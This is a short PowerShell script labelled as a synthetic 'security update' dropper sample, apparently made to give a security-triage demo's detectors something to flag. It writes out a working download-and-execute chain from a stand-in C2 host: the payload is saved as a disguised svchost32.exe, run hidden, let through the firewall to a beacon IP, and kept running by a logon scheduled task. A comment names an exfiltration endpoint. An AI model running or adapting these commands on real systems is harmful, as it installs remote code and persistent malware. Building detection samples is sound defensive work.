# "Security update" dropper — synthetic sample for the CyberTriage demo.
# Do not execute. The strings below are intentionally suspicious so the IOC
# detector, file analyzer and ML scorer have something to flag.

$c2 = "http://malware-c2.xyz/payload.bin"
$fallback = "https://evil-domain.tk/stage2.ps1"
$beacon = "185.220.101.2"

Invoke-WebRequest -Uri $c2 -OutFile "$env:TEMP\svchost32.exe" -UseBasicParsing
Start-Process "$env:TEMP\svchost32.exe" -WindowStyle Hidden
New-NetFirewallRule -DisplayName "WinUpdateSvc" -Direction Outbound -RemoteAddress $beacon -Action Allow
Register-ScheduledTask -TaskName "WinUpdateSvc" -Action (New-ScheduledTaskAction -Execute "$env:TEMP\svchost32.exe") -Trigger (New-ScheduledTaskTrigger -AtLogon)

# Exfiltration target and sample hash observed during triage:
# sha256: 4f3a1d9c7b2e5f608a1c3d5e7f9b0a2c4e6f8a1b3c5d7e9f0a2b4c6d8e0f1a3b
# upload endpoint: $fallback
